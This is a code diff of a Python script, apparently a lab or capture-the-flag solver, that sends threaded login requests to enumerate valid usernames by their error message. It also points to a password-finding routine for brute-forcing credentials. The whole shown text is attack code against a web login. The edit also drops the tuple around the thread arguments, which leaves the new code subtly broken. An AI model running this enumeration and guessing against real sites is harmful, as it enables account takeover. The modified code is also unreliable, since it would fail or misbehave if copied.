@@ -26,7 +26,7 @@ def error_message(username, i):
   error_info = re.findall(r'<p class=is-warning>(.*?)</p>', response.text)[0]
   error_infos[i] = error_info
   
-def username_enum(username, i):
+def username_enum(username):
   data = { 'username' : username, 'password' : 'something' }
   response = requests.post(url = url + '/login', data = data)
   if 'Invalid username or password.' not in response.text:
@@ -53,7 +53,7 @@ def find_password(username, password):
 # Create a thread to enumerate the username
 threads = []
 for i in range(len(usernames)):
-  threads.append(threading.Thread(target=username_enum, args=(usernames[i], i)))
+  threads.append(threading.Thread(target=username_enum, args=(usernames[i])))
   threads[i].start()
 
 for i in range(len(usernames)):
